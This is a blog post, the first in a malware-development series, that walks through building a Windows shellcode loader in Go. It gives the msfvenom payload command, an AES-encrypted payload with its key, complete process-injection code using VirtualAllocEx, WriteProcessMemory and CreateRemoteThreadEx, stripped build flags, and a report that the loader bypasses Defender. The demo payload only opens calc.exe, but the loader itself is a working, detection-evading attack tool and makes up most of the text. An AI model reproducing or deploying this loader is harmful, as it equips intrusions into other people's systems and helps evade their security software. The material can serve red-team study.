---
title: "Malware with Go - 1: Baby Shellcode Loader"
image:
  path: cov.png
layout: "post"
media_subpath: /assets/posts/2024-10-26-maldev-go-1/
categories: [ "Malware" ]
tags: [ "Malware", "go", "windows" ]
---

I will discuss how to create a simple shellcode loader with golang. Msfvenom exec payload will be used. Some critiques and notes will be given in the end.

## Overview on what will be done

We will just chain some well known Windows API calls to:

- Open Handle on a Target Process
- Allocate Virtual Memory in it
- Write the Shellcode in it
- Create a remote thread from the Allocated Memory

This pattern is well know in the malware industry. I call it "Baby Shellcode Loader" because security solutions are well aware of these loader and normally have multiple measure to detect it.

## Preparing the Shellcode - AES Ciphering

To generate the shellcode we will use the classic exec payload for msfvenom. We will run calc.exe. To generate such payload we can use the following command:

```bash
msfvenom -p windows/x64/exec CMD="calc.exe" EXITFUNC=thread -f go
```

It will output the shellcode in go format.
```go
buf :=  []byte{0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,
0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,
...
```

This shellcode is what we will copy to the memory of the process. To do that we will need to save it in a variable in our code. 

As msfvenom payload are already known by security solution, instead of saving it directly in the code, I will cipher it with AES PKCS7, store the ciphered payload and the key in the code, then decrypt at runtime before copying in memory.

I decided to use AES, but you can use any encryption method (XOR, RC4 etc), or obfuscation.


## Calling Winapi in Go

Calling windows api in go is fun and can be done in many ways (all eventually use the same SyscallN at the end though). For this post I will stick with `golang.org/x/sys/windows` package.

When you want to call a windows api function, if you are lucky enough, it will be already in `golang.org/x/sys/windows`. You will just have to read the documentation and call it.

If you are not so lucky, the windows api function is not defined in the windows package. That just forces you to find the function address from the DLL and call it by hand.

For example `WriteProcessMemory` is defined in the windows package, `CreateRemoteThreadEx` is not.

## The API call needed

For our loader to work, we will need:

- `OpenProcess` to Open a Handle to the target process (In Windows package)
- `VirtualAllocEx` to Allocate Memory in the remote process (Not in Windows package)
- `WriteProcessMemory` to copy our decrypted Shellcode to the remote process (In Windows package)
- `VirtualProtectEx` to make the allocated memory executable (Not in Windows package)
- `CreateRemoteThreadEx` to create the thread in the remote process (Not in Windows package)

## The Loader

### Importing package

First we will import the needed packages

```go

package main

import (
	"flag"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"loader/utils/cipher"
)

```

The `loader/utils/cipher` is a custom code that contain wrapper around AES crypto primitive made in go.
Again, you can replace it with whatever suits your need.

### Deciphering the msfvenom payload

We store the msfvenom ciphered with the key, then use the custom AES decipherer to decipher it.

```go
key := []byte{89, 187, 150, 177, 174, 213, 123, 215, 109, 152, 239, 140, 82, 243, 73, 36 }

payloadEncrypted := []byte{31, 37, 251, 239, 216, 154, 149, 91, 247, 184, 40, 165, 246, 11, 158, 116, 212, 106, 242, 58, 217, 3, 178, 64, 191, 125, 106, 38, 188, 236, 209, 157, 71, 238, 163, 111, 42, 128, 196, 28, 148, 39, 247, 102, 111, 106, 53, 198, 227, 207, 138, 44, 134, 102, 4, 160, 171, 122, 246, 217, 81, 183, 7, 224, 247, 122, 202, 86, 165, 34, 124, 77, 184, 70, 9, 171, 152, 198, 178, 150, 92, 80, 26, 120, 64, 161, 182, 41, 14, 108, 189, 69, 30, 73, 6, 42, 33, 154, 74, 21, 111, 26, 50, 7, 124, 72, 186, 219, 16, 192, 153, 79, 22, 137, 90, 244, 240, 32, 40, 164, 132, 22, 125, 62, 19, 132, 215, 77, 170, 231, 227, 173, 188, 182, 51, 151, 119, 14, 168, 118, 140, 75, 1, 86, 63, 19, 105, 95, 145, 95, 183, 149, 170, 40, 22, 219, 151, 213, 32, 92, 92, 250, 73, 193, 195, 1, 19, 136, 135, 123, 148, 25, 245, 108, 113, 164, 172, 53, 164, 222, 121, 244, 53, 89, 113, 126, 64, 108, 206, 151, 22, 50, 47, 58, 84, 244, 109, 185, 207, 194, 107, 177, 16, 172, 60, 177, 250, 217, 236, 206, 147, 142, 137, 198, 10, 172, 238, 166, 120, 148, 151, 120, 119, 130, 124, 25, 252, 162, 172, 119, 170, 67, 37, 158, 33, 24, 106, 188, 182, 73, 144, 216, 225, 225, 2, 229, 224, 227, 120, 157, 174, 137, 3, 109, 179, 99, 43, 188, 31, 29, 167, 179, 177, 219, 226, 203, 230, 115, 175, 245, 128, 33, 194, 69, 151, 108, 232, 248, 137, 154, 11, 0, 158, 162, 20, 138, 135, 170, 97, 212, 97, 46, 138, 71, 188, 130, 50, 34, 109, 240, 185, 59, 117, 165 }


ppayloadDecrypted := cipher.AesDecrypt(&key, &payloadEncrypted)

```

Note that `ppayloadDecrypted` is of type `*[]byte`

### Opening Handle to the remote process

We take the PID of the remote process from the command line using Go flag package.

```go
pid := flag.Int("pid", 0, "the pid of the process to inject too")
flag.Parse()
```

Then we use the `OpenProcess` windows api to get a Handle.

```go
phandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, uint32(*pid))
if err != nil {
	fmt.Println("failed to open handle on process")
	fmt.Println(err.Error())
```


### Allocating Memory

To allocate memory `VirtualAllocEx` is needed. We can Load `kernel32.dll` as a lazy dll, then find the call in that dll, then do the actual call.

```go
kernel32DLL := windows.NewLazySystemDLL("kernel32.dll")
VirtualAllocEx := kernel32DLL.NewProc("VirtualAllocEx")
pShellCodeAddress, _, err := VirtualAllocEx.Call(uintptr(phandle), 0, uintptr(len(*ppayloadDecrypted)), windows.MEM_COMMIT | windows.MEM_RESERVE, windows.PAGE_READWRITE)
if err != nil && err.Error() != "The operation completed successfully." {
	fmt.Println("Failed to VirtuAllocEx")
	fmt.Println(err)
}
```

Note that to be more stealthy, we create the memory in Read Write only and not Read Write Execute.


### Write the Shellcode

Now, we can write the Deciphered shellcode to the newly allocated memory.

```go
var numByteWritten uintptr
err = windows.WriteProcessMemory(phandle, pShellCodeAddress, &(*ppayloadDecrypted)[0], uintptr(len(*ppayloadDecrypted)), &numByteWritten)
if err != nil {
	fmt.Println("Failed to Wrtie Process Memory")
	fmt.Println(err)
}
```

### Modify Memory Permission

Now that we have the shellcode in the remote process memory, we need to make it executable. We will use `VirtualProtectEx` windows api call. As it is not in the windows package, we will use the previously loaded Lazy DLL of `kernel32.dll`.

```go
var oldProtection uintptr
VirtualProtectEx := kernel32DLL.NewProc("VirtualProtectEx")
_, _, err = VirtualProtectEx.Call(uintptr(phandle), pShellCodeAddress, uintptr(len(*ppayloadDecrypted)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProtection)))
if err != nil && err.Error() != "The operation completed successfully." {
	fmt.Println("Failed to Change Process Memory Protection")
	fmt.Println(err)
}
```

### Creating the Remote Thread

We can than create the remote process using `CreateRemoteProcessEx`

```go	
CreateRemoteThreadEx := kernel32DLL.NewProc("CreateRemoteThreadEx")
_, _,	 err = CreateRemoteThreadEx.Call(uintptr(phandle), 0, 0, pShellCodeAddress, 0, 0, 0)
if er	r != nil {
	fmt	.Println("Failed to Start Thread")
	fmt	.Println(err)
}
```

## Running the Loader - Example

### Compiling

First, we need to compile the previous go code to a PE.

We will use the following:

```bash
GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -trimpath -o hiddenvirtalloc.exe cmd/main.go
```

### Injecting into Notepad

As a demo, we will inject into notepad.exe.

![](demo.png)

The calc.exe is launched (even though for some reason the loader is not exiting properly)

## Some Notes and Critiques

### VirusTotal

This method should be well known by the security solution industry. However the loader we made bypasses defender. Using VirusTotal, we can see that 11 Security Vendor flag the file.

![](virustotal.png)

With time, I think this will be more and more detected.

### Go is good for malwares but ...

Mainly two limitation I noticed why developing Droppers in go.

The first is the size of the binary. For instance the above binary is 1.77 MB. 

The second one is the Import Address Table. As it can be seen by virustotal (or any other local dumping tool), the IAT is far from empty.
While the IAT does not contain the function we called _ no `WriteProcessMemory` no `VirtualAllocEx` etc _ it still contain some API calls from kernel32.dll. While we did not directly use them, these calls are used by Go at runtime for the garbage collector and memory manager.

In futur posts, we will address these issues, to decrease Binary Size, and make the IAT less empty by modifying the go toolchain.





